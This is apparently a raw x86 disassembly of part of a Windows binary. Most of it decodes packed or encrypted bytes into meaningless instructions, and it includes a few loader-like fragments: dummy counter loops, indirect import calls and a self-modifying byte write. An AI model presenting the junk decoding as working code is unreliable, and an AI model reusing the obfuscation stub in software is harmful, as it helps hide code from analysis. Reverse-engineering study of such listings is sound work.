  406301:	test   DWORD PTR [eax],edx
  406303:	cmc    
  406304:	sbb    esi,DWORD PTR [esp+esi*2]
  406307:	inc    eax
  406308:	xor    eax,0x136e49f1
  40630d:	adc    cl,cl
  40630f:	push   edi
  406310:	cmp    ah,cl
  406312:	adc    al,0x82
  406314:	pusha  
  406315:	push   esi
  406316:	pop    ss
  406317:	imul   ebp,ebp,0xb5547fc7
  40631d:	pop    ss
  40631e:	jp     0x406399
  406320:	mov    cl,0x79
  406322:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406323:	int    0x68
  406325:	jp     0x40632a
  406327:	dec    ebx
  406328:	rcl    DWORD PTR [esi+ebp*8+0x35],0x7c
  40632d:	xchg   BYTE PTR [edx-0x51086faa],dl
  406333:	sub    al,0xbe
  406335:	fwait
  406336:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406337:	pop    ds
  406338:	jae    0x4062d2
  40633a:	sub    eax,0x9a036b3f
  40633f:	retf   
  406340:	je     0x406366
  406342:	enter  0xc874,0x77
  406346:	cmp    BYTE PTR [esi-0x23],al
  406349:	jmp    0x40639b
  40634b:	sub    BYTE PTR [edx],bh
  40634d:	jp     0x406318
  40634f:	inc    esi
  406350:	hlt    
  406351:	mov    edx,0x2cdce4e7
  406356:	and    DWORD PTR [ebx+0x4e],0xf612635f
  40635d:	cdq    
  40635e:	cmp    ebp,DWORD PTR [eax-0x3b]
  406361:	sbb    DWORD PTR [ecx],0x593278e3
  406367:	xor    eax,0x48bfed86
  40636c:	sbb    al,0x2f
  40636e:	mov    al,0xff
  406370:	outs   dx,BYTE PTR ds:[esi]
  406371:	cmp    DWORD PTR [eax+0x382a78cc],ecx
  406377:	pop    ebp
  406378:	fsub   st(4),st
  40637a:	pop    ebx
  40637b:	dec    ecx
  40637c:	and    dh,0x82
  40637f:	(bad)  
  406381:	(bad)  
  406382:	mov    esp,DWORD PTR [ebx+ebx*2+0x122bcb65]
  406389:	push   0x81b6485e
  40638e:	adc    al,0xe2
  406390:	sub    ch,ah
  406392:	inc    esi
  406393:	imul   esi,eax,0xdbe2b83c
  406399:	mov    ebx,0xdc0a6cbd
  40639e:	ror    al,0x48
  4063a1:	inc    ebp
  4063a2:	pop    esp
  4063a3:	mov    ch,bh
  4063a5:	jne    0x4063b4
  4063a7:	mov    esp,0x67c774e4
  4063ac:	push   0xb6d3b6e4
  4063b1:	dec    eax
  4063b2:	dec    edi
  4063b3:	iret   
  4063b4:	inc    edx
  4063b5:	test   eax,0x75ffd396
  4063ba:	hlt    
  4063bb:	push   DWORD PTR [ebp-0x14]
  4063be:	jmp    0x4065b6
  4063c3:	push   edi
  4063c4:	mov    bh,BYTE PTR [esi+0x51514381]
  4063ca:	dec    eax
  4063cb:	sub    DWORD PTR [eax],eax
  4063cd:	enter  0x6ee0,0xc5
  4063d1:	fmul   st,st(7)
  4063d3:	aam    0x31
  4063d5:	jle    0x406455
  4063d7:	push   ebp
  4063d8:	jg     0x406458
  4063da:	jle    0x40636d
  4063dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063dd:	ss push ds
  4063df:	mov    bh,0xa6
  4063e1:	stos   BYTE PTR es:[edi],al
  4063e2:	mov    al,0xf8
  4063e4:	pop    ss
  4063e5:	jp     0x40638e
  4063e7:	arpl   WORD PTR [esi-0x25],dx
  4063ea:	test   al,0x87
  4063ec:	inc    edi
  4063ed:	xchg   DWORD PTR [esi+eax*1-0x758f16e6],edx
  4063f4:	xor    esi,eax
  4063f6:	sub    al,0x7c
  4063f8:	cmc    
  4063f9:	daa    
  4063fa:	jecxz  0x4063ca
  4063fc:	stc    
  4063fd:	inc    esi
  4063fe:	jb     0x4063dd
  406400:	add    edx,DWORD PTR [esi+0x719367c4]
  406406:	or     bl,bl
  406408:	xor    BYTE PTR [edx],cl
  40640a:	inc    edx
  40640b:	lock inc esp
  40640d:	jno    0x4063fc
  40640f:	mov    edx,0xee5bd027
  406414:	test   DWORD PTR [edi],eax
  406416:	mov    edi,0xb0da9e09
  40641b:	sahf   
  40641c:	adc    ebp,DWORD PTR [ebx+0x39]
  40641f:	jno    0x40647c
  406421:	jecxz  0x4063be
  406423:	dec    esi
  406424:	mov    WORD PTR es:[bp+di+0x39],?
  406429:	xchg   DWORD PTR [eax+0x5313d7ba],esi
  40642f:	jmp    0x86da7ee8
  406434:	pop    eax
  406435:	push   edi
  406436:	xchg   ecx,eax
  406437:	jle    0x4063e5
  406439:	mov    bh,0x93
  40643b:	stc    
  40643c:	inc    edx
  40643d:	sbb    dh,BYTE PTR [ecx]
  40643f:	ins    DWORD PTR es:[edi],dx
  406440:	outs   dx,BYTE PTR ds:[esi]
  406441:	fwait
  406442:	push   esi
  406443:	lods   eax,DWORD PTR gs:[esi]
  406445:	mov    edi,0x2f8a06fe
  40644a:	shl    eax,0x99
  40644d:	adc    BYTE PTR [eax+0x2cc4b209],bh
  406453:	iret   
  406454:	(bad)  
  406455:	sbb    ch,al
  406457:	(bad)  
  406458:	mov    edx,0x7a83b584
  40645d:	ret    0xfe8a
  406460:	push   esi
  406461:	test   BYTE PTR [ecx-0x25],cl
  406464:	mov    ecx,0x65189a7
  406469:	cmp    al,0x2d
  40646b:	cdq    
  40646c:	xchg   ecx,eax
  40646d:	aad    0x6d
  40646f:	or     eax,0x233b2ef3
  406474:	fwait
  406475:	ins    BYTE PTR es:[edi],dx
  406476:	ror    ch,1
  406478:	push   ebx
  406479:	xchg   ebp,eax
  40647a:	test   WORD PTR [esi-0x4f],dx
  40647e:	cmc    
  40647f:	test   bh,dl
  406481:	mov    al,0x61
  406483:	mov    cl,0x6f
  406485:	ja     0x406447
  406487:	or     BYTE PTR [edi-0x2d967f7b],dh
  40648d:	pusha  
  40648e:	jecxz  0x406420
  406490:	jo     0x406485
  406492:	lahf   
  406493:	push   0x2f626d34
  406498:	pop    edx
  406499:	stos   DWORD PTR es:[edi],eax
  40649a:	cmp    BYTE PTR [ebp-0x28],bh
  40649d:	and    edx,ebp
  40649f:	add    al,0xe4
  4064a1:	ins    DWORD PTR es:[edi],dx
  4064a2:	xchg   edi,eax
  4064a3:	pop    ecx
  4064a4:	mov    dh,BYTE PTR [ebx-0x5f535914]
  4064aa:	pop    ecx
  4064ab:	fidivr DWORD PTR [edx]
  4064ad:	ret    
  4064ae:	adc    DWORD PTR [ebx+0x79],ebx
  4064b1:	mov    ds:0xb41e94bd,al
  4064b6:	cmp    bl,BYTE PTR [eax+eiz*4+0x1d]
  4064ba:	test   al,0x66
  4064bc:	ins    BYTE PTR es:[edi],dx
  4064bd:	dec    ebp
  4064be:	mov    eax,DWORD PTR [eax]
  4064c0:	mov    edx,0x499a170c
  4064c5:	adc    al,0x1f
  4064c7:	into   
  4064c8:	sbb    al,0x58
  4064ca:	arpl   WORD PTR [ebp+0xc],dx
  4064cd:	shr    BYTE PTR [ecx-0x1ba82cf4],0x1a
  4064d4:	push   0x11ac76d7
  4064d9:	jp     0x4064c8
  4064db:	add    DWORD PTR [ebp+0x15],ebx
  4064de:	cli    
  4064df:	or     BYTE PTR [esi+0x46],0xfe
  4064e3:	jmp    0xfc21ae7
  4064e8:	cmp    DWORD PTR [edx],0x377edd2d
  4064ee:	push   ds
  4064ef:	push   ecx
  4064f0:	jle    0x4064d5
  4064f2:	leave  
  4064f3:	sub    ecx,DWORD PTR [ecx+0xf]
  4064f6:	push   ss
  4064f7:	sar    BYTE PTR ds:0xc4b8dc6b,cl
  4064fd:	and    eax,DWORD PTR [eax]
  4064ff:	ss das 
  406501:	mov    esp,0x9d0e516
  406506:	lods   al,BYTE PTR ds:[esi]
  406507:	xor    BYTE PTR [edx+0x5e195044],bl
  40650d:	add    eax,DWORD PTR [ecx]
  40650f:	inc    ecx
  406510:	dec    esp
  406511:	(bad)  
  406512:	retf   
  406513:	jecxz  0x40657d
  406515:	or     BYTE PTR [ebp-0x292f6359],ch
  40651b:	ficom  DWORD PTR [ebp+0x30a44758]
  406521:	jae    0x406594
  406523:	pop    esi
  406524:	sbb    esp,DWORD PTR ds:0x1def4dc1
  40652a:	push   ds
  40652b:	or     eax,0xfa1dc0eb
  406530:	ja     0x406562
  406532:	jg     0x406525
  406534:	pop    ebp
  406535:	adc    edx,esp
  406537:	push   0xfffffff7
  406539:	sbb    eax,0x6423799a
  40653e:	mov    bl,0xc
  406540:	in     eax,0x5e
  406542:	int3   
  406543:	call   0x2380665d
  406548:	add    DWORD PTR [eax+0x26],ebp
  40654b:	and    ebp,ebx
  40654d:	out    dx,eax
  40654e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40654f:	aam    0x64
  406551:	xchg   BYTE PTR [ebx+ecx*8-0x18021893],dh
  406558:	je     0x40658e
  40655a:	mov    dh,0x64
  40655c:	push   ss
  40655d:	jmp    0x4065b6
  40655f:	sub    eax,0x6895d61f
  406564:	push   ss
  406565:	pop    esp
  406566:	cmc    
  406567:	test   al,0x7d
  406569:	jge    0x4065ad
  40656b:	lds    esp,FWORD PTR [eax]
  40656d:	dec    esp
  40656e:	mov    ah,0xe2
  406570:	inc    edi
  406571:	retf   
  406572:	dec    ecx
  406573:	mov    BYTE PTR [ebx-0x42],ch
  406576:	rcl    DWORD PTR [edi+esi*4],1
  406579:	ret    
  40657a:	into   
  40657b:	cld    
  40657c:	test   eax,0x88cfb666
  406581:	add    eax,edx
  406583:	pop    edi
  406584:	out    0x42,eax
  406586:	dec    ebx
  406587:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406588:	push   esi
  406589:	mov    ah,0xbd
  40658b:	aas    
  40658c:	sub    eax,esp
  40658e:	sub    ah,BYTE PTR [eax]
  406590:	add    esi,DWORD PTR [ecx+0x1030008a]
  406596:	ja     0x406611
  406598:	aam    0xdc
  40659a:	imul   edx,DWORD PTR [ebp-0x3fbaa3a5],0x2c
  4065a1:	cmc    
  4065a2:	push   es
  4065a3:	fwait
  4065a4:	out    0xcf,eax
  4065a6:	add    DWORD PTR [ebp-0x2fa9d12c],eax
  4065ac:	test   eax,0x8770f4b5
  4065b1:	xlat   BYTE PTR ds:[ebx]
  4065b2:	div    eax
  4065b4:	les    ecx,FWORD PTR [ebx]
  4065b6:	call   0x404d49
  4065bb:	test   eax,eax
  4065bd:	je     0x4065e8
  4065c3:	lea    eax,[ebp-0x78]
  4065c6:	push   eax
  4065c7:	mov    eax,DWORD PTR [ebp-0x14]
  4065ca:	xor    eax,esi
  4065cc:	add    eax,edi
  4065ce:	push   eax
  4065cf:	mov    eax,DWORD PTR [ebp-0x10]
  4065d2:	add    eax,0xee
  4065d7:	push   eax
  4065d8:	mov    eax,DWORD PTR [ebp-0x10]
  4065db:	mov    eax,DWORD PTR [eax+0x198]
  4065e1:	push   DWORD PTR [eax]
  4065e3:	call   0x40cdc5
  4065e8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4065eb:	xor    ecx,esi
  4065ed:	jmp    0x4067e5
  4065f2:	fwait
  4065f3:	imul   edx,eax,0x42
  4065f6:	shl    BYTE PTR [ecx-0x57],1
  4065f9:	jae    0x406585
  4065fb:	sbb    edi,DWORD PTR [edx+edx*1+0x4dc4694c]
  406602:	sub    edi,DWORD PTR [edi]
  406604:	jle    0x406684
  406606:	push   ebp
  406607:	jg     0x406687
  406609:	jle    0x4065cc
  40660b:	call   0xacc54aac
  406610:	pop    edx
  406611:	xchg   esp,eax
  406612:	jns    0x406693
  406614:	fsubr  st(4),st
  406616:	mov    ds:0x593abc39,eax
  40661b:	cld    
  40661c:	pop    esi
  40661d:	in     al,dx
  40661e:	pop    ebp
  40661f:	iret   
  406620:	adc    BYTE PTR [ecx],0xa0
  406623:	push   ds
  406624:	loopne 0x406646
  406626:	or     al,0x9e
  406628:	xchg   esi,eax
  406629:	sar    BYTE PTR [eax-0x27],cl
  40662c:	bswap  esp
  40662e:	out    0x2d,eax
  406630:	push   es
  406631:	aad    0xb9
  406633:	jle    0x4065ea
  406635:	adc    cl,BYTE PTR [ebx-0x5d]
  406638:	pop    ebx
  406639:	adc    eax,0x5d470221
  40663e:	in     eax,dx
  40663f:	xchg   esi,eax
  406640:	ja     0x406688
  406642:	cmp    edi,DWORD PTR [esi-0x70224c33]
  406648:	mov    DWORD PTR [ebx+0x64],esi
  40664b:	shl    BYTE PTR [edx-0xd],1
  40664e:	loop   0x406610
  406650:	mov    ebx,0x44d11479
  406655:	ins    DWORD PTR es:[edi],dx
  406656:	ja     0x4066cc
  406658:	xchg   ebp,eax
  406659:	mov    bl,0x8c
  40665b:	or     ecx,DWORD PTR [edx]
  40665d:	ins    BYTE PTR es:[edi],dx
  40665e:	lahf   
  40665f:	call   0xd54eb784
  406664:	mov    ch,0x23
  406666:	fbstp  TBYTE PTR [esp+edi*8-0x4b]
  40666a:	mov    es,edx
  40666c:	xor    al,0x5e
  40666e:	xor    edi,DWORD PTR [ebp+0x7e]
  406671:	mov    DWORD PTR [ecx],ebp
  406673:	xor    al,0xce
  406675:	and    al,0xa8
  406677:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406678:	rcr    dh,cl
  40667a:	pop    ss
  40667b:	xor    eax,0x212fc759
  406680:	or     BYTE PTR [esi],dl
  406682:	adc    DWORD PTR [ecx+0x286a895d],eax
  406688:	inc    esp
  406689:	jge    0x406633
  40668b:	adc    DWORD PTR [ebp+0x112cb7a9],0xca1d4c39
  406695:	sub    DWORD PTR [edx],esp
  406697:	loop   0x406649
  406699:	add    al,0xe5
  40669b:	cmp    bl,BYTE PTR [ecx+0x6a]
  40669e:	jmp    0x406709
  4066a0:	bound  esp,QWORD PTR [ecx-0x68]
  4066a3:	out    dx,eax
  4066a4:	cwde   
  4066a5:	hlt    
  4066a6:	and    ebp,DWORD PTR [esi-0x6e]
  4066a9:	rcr    BYTE PTR [ebp+0x75],0x95
  4066ad:	iret   
  4066ae:	cdq    
  4066af:	dec    edx
  4066b0:	loopne 0x4066c1
  4066b2:	inc    ebp
  4066b3:	pop    es
  4066b4:	and    al,dh
  4066b6:	ret    0x1c2a
  4066b9:	mov    ah,0xe8
  4066bb:	out    0xfa,al
  4066bd:	ins    BYTE PTR es:[edi],dx
  4066be:	jle    0x4066b6
  4066c0:	inc    edx
  4066c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066c2:	jle    0x406668
  4066c4:	loop   0x40664e
  4066c6:	jecxz  0x406655
  4066c8:	stos   BYTE PTR es:[edi],al
  4066c9:	js     0x4066a5
  4066cb:	xlat   BYTE PTR ds:[ebx]
  4066cc:	(bad)  
  4066cd:	iret   
  4066ce:	(bad)  
  4066cf:	leave  
  4066d0:	(bad)  
  4066d1:	pop    ebp
  4066d2:	jmp    0x241c02d8
  4066d7:	xchg   ebx,eax
  4066d8:	sbb    BYTE PTR [edx-0x286b9b4c],0xaf
  4066df:	mov    edx,0x75dd5f00
  4066e4:	int3   
  4066e5:	data16 loope 0x40671e
  4066e8:	push   0x20
  4066ea:	add    al,0x43
  4066ec:	mov    dh,0x34
  4066ee:	test   eax,0x420f536f
  4066f3:	cmp    DWORD PTR [eax+0x65637ab3],edi
  4066f9:	sub    BYTE PTR [edi],dh
  4066fb:	pop    ebx
  4066fc:	pop    ss
  4066fd:	inc    edx
  4066fe:	in     eax,0xf7
  406700:	mov    ebp,0xa184d27b
  406705:	out    0x1e,eax
  406707:	add    BYTE PTR [ebx],ch
  406709:	push   ecx
  40670a:	mov    dl,0xfa
  40670c:	jbe    0x4066c0
  40670e:	dec    edi
  40670f:	xchg   ebx,eax
  406710:	and    dh,BYTE PTR [ebp-0x11]
  406713:	hlt    
  406714:	mov    cl,BYTE PTR ds:0x7513485
  40671a:	addr16 pop es
  40671c:	addr16 (bad) 
  40671f:	adc    eax,DWORD PTR [ecx-0x1fc1182c]
  406725:	inc    eax
  406726:	scas   al,BYTE PTR es:[edi]
  406727:	jae    0x406720
  406729:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40672a:	ja     0x40674d
  40672c:	retf   
  40672d:	ret    
  40672e:	xor    eax,0x2777f371
  406733:	push   cs
  406734:	pop    es
  406735:	(bad)  
  406736:	and    al,0x56
  406738:	xor    ah,BYTE PTR [esi+0x2a3ca79d]
  40673e:	gs sbb edx,ecx
  406741:	xchg   esi,edx
  406743:	mov    ah,0x45
  406745:	(bad)  
  406746:	and    eax,DWORD PTR [edi]
  406748:	ds sti 
  40674a:	cmp    edx,DWORD PTR [esi]
  40674c:	jp     0x406715
  40674e:	lds    ebx,FWORD PTR [edi-0x26]
  406751:	push   0x6c
  406753:	jge    0x4066ec
  406755:	add    BYTE PTR [ecx],ah
  406757:	xor    edi,edi
  406759:	xchg   ecx,eax
  40675a:	mov    ch,0xb9
  40675c:	xchg   edi,eax
  40675d:	mov    bh,0x1
  40675f:	ins    DWORD PTR es:[edi],dx
  406760:	xchg   DWORD PTR [edx-0x25],edi
  406763:	test   DWORD PTR ds:0x8836c4a6,ebx
  406769:	ffreep st(3)
  40676b:	mov    ds:0x44f5b85a,al
  406770:	dec    ecx
  406771:	sub    ecx,DWORD PTR [edx+0x28]
  406774:	pop    ecx
  406775:	jmp    0xde76fe06
  40677a:	dec    ecx
  40677b:	dec    esp
  40677c:	int    0xda
  40677e:	mov    bl,0x7b
  406780:	sbb    DWORD PTR [edx+0x3d374cd5],0x7
  406787:	sub    ebp,ecx
  406789:	into   
  40678a:	cmp    edx,DWORD PTR [edi]
  40678c:	imul   edx,edx,0xffffffd8
  40678f:	add    DWORD PTR [ebp+0x7c9aca3d],esp
  406795:	je     0x406742
  406797:	test   al,0x54
  406799:	dec    edi
  40679a:	test   DWORD PTR [ebx+0x724ca72e],0x9e0f008
  4067a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4067a5:	cmp    eax,0xde698d1
  4067aa:	les    esi,FWORD PTR [ebx-0x1e11d197]
  4067b0:	js     0x406806
  4067b2:	sbb    BYTE PTR [ecx],bh
  4067b4:	inc    eax
  4067b5:	(bad)  
  4067b6:	push   ds
  4067b7:	pop    ebp
  4067b8:	jge    0x4067e9
  4067ba:	push   ecx
  4067bb:	retf   
  4067bc:	in     eax,0xcd
  4067be:	xchg   ebx,eax
  4067bf:	ficomp WORD PTR fs:[ebp-0xd120613]
  4067c6:	std    
  4067c7:	fdivp  st(3),st
  4067c9:	inc    edx
  4067ca:	into   
  4067cb:	aas    
  4067cc:	dec    ebx
  4067cd:	std    
  4067ce:	and    BYTE PTR [ebx-0x2e0c3f73],dl
  4067d4:	jmp    0xde16:0x13505b2
  4067db:	cli    
  4067dc:	aam    0x4e
  4067de:	ror    BYTE PTR [ebp+0x38a49e21],1
  4067e4:	pop    es
  4067e5:	mov    eax,0xffcd8d65
  4067ea:	sub    eax,ecx
  4067ec:	sub    eax,DWORD PTR [ebp-0x8]
  4067ef:	mov    ecx,DWORD PTR [ebp-0x30]
  4067f2:	add    ecx,eax
  4067f4:	mov    eax,DWORD PTR [ebp-0x8]
  4067f7:	mov    DWORD PTR [eax+0x1],ecx
  4067fa:	mov    al,BYTE PTR [ebp-0x1]
  4067fd:	mov    ecx,DWORD PTR [ebp-0x8]
  406800:	xor    al,0x46
  406802:	sub    al,0x38
  406804:	mov    BYTE PTR [ecx],al
  406806:	lea    eax,[ebp-0x8]
  406809:	inc    BYTE PTR [eax]
  40680b:	inc    eax
  40680c:	push   eax
  40680d:	pop    ecx
  40680e:	dec    ecx
  40680f:	xchg   ecx,edx
  406811:	dec    BYTE PTR [edx]
  406813:	push   DWORD PTR [ebp-0x10]
  406816:	mov    eax,ds:0x412264
  40681b:	mov    eax,DWORD PTR [eax]
  40681d:	push   DWORD PTR [eax]
  40681f:	lea    eax,ds:0x412280
  406825:	push   DWORD PTR [eax]
  406827:	lea    eax,ds:0x41202c
  40682d:	push   DWORD PTR [eax]
  40682f:	lea    eax,ds:0x412260
  406835:	push   DWORD PTR [eax]
  406837:	lea    eax,ds:0x4122f4
  40683d:	push   DWORD PTR [eax]
  40683f:	xchg   ebx,edx
  406841:	inc    ebx
  406842:	inc    ebx
  406843:	sub    ebx,0x3
  406846:	push   ebx
  406847:	jmp    0x406a3f
  40684c:	xchg   edx,eax
  40684d:	lods   al,BYTE PTR ds:[esi]
  40684e:	sbb    eax,0x91ab211a
  406853:	mov    ah,0x54
  406855:	jmp    0x2fb9:0xcd76f6f1
  40685c:	push   cs
  40685d:	cmp    eax,0x7f557e7e
  406862:	jle    0x4068e2
  406864:	mov    eax,DWORD PTR [ecx]
  406866:	je     0x406882
  406868:	shl    bl,0x81
  40686b:	and    BYTE PTR [esi+edi*1],dh
  40686e:	add    esp,DWORD PTR [edx-0x44]
  406871:	nop
  406872:	cdq    
  406873:	mov    esi,DWORD PTR [ebp-0x60b3de7b]
  406879:	(bad)  
  40687a:	cmp    BYTE PTR [edx+eax*1-0x37],al
  40687e:	aaa    
  40687f:	es mov eax,0x28413796
  406885:	js     0x40683e
  406887:	mov    cs,ecx
  406889:	rol    BYTE PTR [edi+0x33],1
  40688c:	jbe    0x4068a0
  40688e:	add    ch,0x14
  406891:	sbb    ebx,DWORD PTR [edi+0x4f]
  406894:	pop    ss
  406895:	sub    BYTE PTR [ebp-0x1f],cl
  406898:	push   es
  406899:	popa   
  40689a:	mov    ds:0xe3d21725,eax
  40689f:	mov    al,ds:0xb1c00ee7
  4068a4:	jp     0x40682c
  4068a6:	lock or al,0x5c
  4068a9:	les    edx,FWORD PTR [eax+ebp*4-0x7f]
  4068ad:	mov    eax,ds:0x2d588378
  4068b2:	xor    ebp,DWORD PTR [edx+0x12ea6f83]
  4068b8:	enter  0x6804,0x7c
  4068bc:	xlat   BYTE PTR ds:[ebx]
  4068bd:	push   eax
  4068be:	arpl   WORD PTR [ebx],bx
  4068c0:	jp     0x40693f
  4068c2:	adc    ebx,DWORD PTR [esi]
  4068c4:	adc    eax,0x244e3c6
  4068c9:	stc    
  4068ca:	xchg   DWORD PTR [edx-0x75],edi
  4068cd:	jne    0x406877
  4068cf:	push   eax
  4068d0:	pop    esp
  4068d1:	sahf   
  4068d2:	pop    es
  4068d3:	aad    0xc9
  4068d5:	sbb    BYTE PTR [ecx-0x8],dl
  4068d8:	mov    ds:0x8030a612,al
  4068dd:	fs hlt 
  4068df:	add    BYTE PTR [esi+0x40],0x68
  4068e3:	arpl   WORD PTR [edi-0x45e5b457],dx
  4068e9:	jnp    0x40695c
  4068eb:	sbb    edi,esp
  4068ed:	inc    ebx
  4068ee:	jecxz  0x4068f3
  4068f0:	(bad)  
  4068f1:	push   ebp
  4068f2:	pop    es
  4068f3:	cmp    al,BYTE PTR [edx+eax*2+0x3b]
  4068f7:	out    0xee,eax
  4068f9:	xor    eax,esi
  4068fb:	push   eax
  4068fc:	xor    eax,DWORD PTR [esi-0x42537ac2]
  406902:	(bad)  
  406903:	dec    ecx
  406904:	ja     0x406933
  406906:	loopne 0x40695c
  406908:	(bad)  
  406909:	in     al,0xfb
  40690b:	cmc    
  40690c:	push   cs
  40690d:	cwde   
  40690e:	das    
  40690f:	jecxz  0x406922
  406911:	and    al,al
  406913:	sub    DWORD PTR [eax-0x355a47b1],0xc855c4bd
  40691d:	in     al,0xc1
  40691f:	daa    
  406920:	cmp    al,0x5e
  406922:	and    ecx,ecx
  406924:	jmp    0x406923
  406926:	out    0xed,al
  406928:	(bad)  
  406929:	icebp  
  40692a:	pop    esp
  40692b:	jp     0x406961
  40692d:	mov    bh,0xce
  40692f:	pop    ebx
  406930:	daa    
  406931:	loop   0x406990
  406933:	sbb    edi,DWORD PTR [esi-0x70c3b691]
  406939:	dec    esp
  40693a:	stos   BYTE PTR es:[edi],al
  40693b:	loop   0x40699c
  40693d:	mov    DWORD PTR [edi],esp
  40693f:	inc    edx
  406940:	ret    
  406941:	aaa    
  406942:	dec    esp
  406943:	mov    ebx,0x16e4c63d
  406948:	xor    al,0xdf
  40694a:	lahf   
  40694b:	rcr    esp,1
  40694d:	stos   BYTE PTR es:[edi],al
  40694e:	test   eax,0x68153b5a
  406953:	aam    0x8c
  406955:	and    BYTE PTR [ecx-0x41],dl
  406958:	int3   
  406959:	adc    edx,ebp
  40695b:	mov    ebx,0x4e47eefd
  406960:	push   edx
  406961:	mov    DWORD PTR [ecx-0x5e],ecx
  406964:	and    bl,BYTE PTR [ebp-0x5f]
  406967:	and    al,0x26
  406969:	rcl    eax,0x75
  40696c:	(bad)  
  40696d:	call   0x2d5ea31e
  406972:	(bad)  
  406973:	push   eax
  406974:	fidiv  WORD PTR [eax+esi*8]
  406977:	pop    esi
  406978:	jl     0x406981
  40697a:	dec    esi
  40697b:	xchg   esp,eax
  40697c:	sbb    ebx,DWORD PTR [esi]
  40697e:	sub    eax,0x7efbc34f
  406983:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406984:	add    al,0x4c
  406986:	mov    dh,0xca
  406988:	imul   ebp,DWORD PTR [edx-0x61d15f75],0x1f4e851c
  406992:	sub    eax,0xc5dd9ec0
  406997:	aas    
  406998:	mov    cl,0x9f
  40699a:	jmp    0x4069dc
  40699c:	adc    esp,DWORD PTR [ebx]
  40699e:	ss aam 0x2b
  4069a1:	rcr    DWORD PTR [ebx+0x22456edb],0xa3
  4069a8:	mul    BYTE PTR [ebx]
  4069aa:	push   edi
  4069ab:	dec    ecx
  4069ac:	mov    ebp,0x615043e2
  4069b1:	pop    ds
  4069b2:	mov    ah,0x7d
  4069b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4069b5:	pop    eax
  4069b6:	mov    eax,0xe7cc0048
  4069bb:	and    ebx,DWORD PTR ds:0xb22cbe2b
  4069c1:	jno    0x4069e6
  4069c3:	fcompp 
  4069c5:	loopne 0x40698f
  4069c7:	or     BYTE PTR [ebx],bl
  4069c9:	fldcw  WORD PTR [ecx+0x4b4db3a6]
  4069cf:	cmp    eax,DWORD PTR [edi+0x4ef94952]
  4069d5:	out    0xf4,eax
  4069d7:	sbb    DWORD PTR [esi],0x8f6603f3
  4069dd:	and    DWORD PTR [ebp+0x164bc2c4],ebx
  4069e3:	xor    ah,BYTE PTR [ebp-0x54]
  4069e6:	loopne 0x406a0c
  4069e8:	mov    bh,0x8f
  4069ea:	out    dx,al
  4069eb:	test   eax,0xeda77f9f
  4069f0:	jl     0x406a50
  4069f2:	mov    eax,ds:0xb5ca653b
  4069f7:	mov    ds,WORD PTR [edx]
  4069f9:	jecxz  0x406988
  4069fb:	imul   esi,DWORD PTR [ecx-0x39d37c7f],0xfe1689c7
  406a05:	push   eax
  406a06:	sar    BYTE PTR [edx+eiz*1+0x76f40f2c],1
  406a0d:	push   ds
  406a0e:	mov    eax,ds:0xe36338f0
  406a13:	and    edx,DWORD PTR [edx+eax*2-0x72]
  406a17:	mov    bh,0x80
  406a19:	jae    0x406a2b
  406a1b:	and    al,dh
  406a1d:	adc    dl,BYTE PTR [esi+0x4b]
  406a20:	and    edi,DWORD PTR [ecx+0x72]
  406a23:	pop    edx
  406a24:	scas   eax,DWORD PTR es:[edi]
  406a25:	xlat   BYTE PTR ds:[ebx]
  406a26:	(bad)  
  406a27:	leave  
  406a28:	push   ecx
  406a29:	ds mov ah,0xb5
  406a2c:	popf   
  406a2d:	lds    edx,FWORD PTR [ebx-0x20]
  406a30:	inc    ebx
  406a31:	je     0x406a95
  406a33:	and    al,0xbb
  406a35:	dec    eax
  406a36:	dec    ebp
  406a37:	cmp    DWORD PTR [esi],eax
  406a39:	pop    ds
  406a3a:	out    dx,eax
  406a3b:	repnz mov edx,0xff58dfbe
  406a41:	push   eax
  406a42:	add    DWORD PTR [ebx+0xd8be045],ecx
  406a48:	and    al,0x22
  406a4a:	inc    ecx
  406a4b:	add    BYTE PTR [ecx],al
  406a4d:	or     BYTE PTR [edi+0x5e],bl
  406a50:	pop    ebx
  406a51:	leave  
  406a52:	ret    
  406a53:	push   ebp
  406a54:	mov    ebp,esp
  406a56:	sub    esp,0x44
  406a59:	push   edi
  406a5a:	mov    DWORD PTR ds:0x42ede3,0x1a
  406a64:	cmp    DWORD PTR ds:0x42ede3,0x0
  406a6b:	je     0x406ab1
  406a71:	cmp    DWORD PTR ds:0x42ede3,0x25
  406a78:	jne    0x406a8a
  406a7e:	push   DWORD PTR [ebp-0x1c]
  406a81:	push   DWORD PTR [ebp-0x20]
  406a84:	call   DWORD PTR ds:0x42ec1b
  406a8a:	xor    edi,edi
  406a8c:	add    edi,DWORD PTR ds:0x42ede3
  406a92:	dec    edi
  406a93:	mov    DWORD PTR ds:0x42ede3,edi
  406a99:	jmp    0x406a64
  406a9e:	movzx  edi,BYTE PTR ds:0x4304e7
  406aa5:	xor    edi,DWORD PTR ds:0x430435
  406aab:	mov    DWORD PTR ds:0x4304e7,edi
  406ab1:	mov    eax,DWORD PTR [ebp+0xc]
  406ab4:	and    edx,edi
  406ab6:	mov    DWORD PTR [ebp-0x10],eax
  406ab9:	mov    eax,DWORD PTR [ebp+0x8]
  406abc:	and    DWORD PTR ds:0x43045d,0x0
  406ac6:	mov    ecx,DWORD PTR ds:0x43045d
  406acc:	inc    ecx
  406acd:	mov    DWORD PTR ds:0x43045d,ecx
  406ad3:	cmp    DWORD PTR ds:0x43045d,0x23
  406ada:	jne    0x406af9
  406ae0:	push   0x42e8b7
  406ae5:	push   DWORD PTR [ebp-0x28]
  406ae8:	push   DWORD PTR [ebp-0x28]
  406aeb:	push   0x2078
  406af0:	push   DWORD PTR [ebp-0x10]
  406af3:	call   DWORD PTR ds:0x42ec1f
  406af9:	cmp    DWORD PTR ds:0x43045d,0x1c
  406b00:	jb     0x406ac6
  406b06:	or     edi,0x11f2
  406b0c:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  406b13:	mov    DWORD PTR ds:0x4304df,0x15
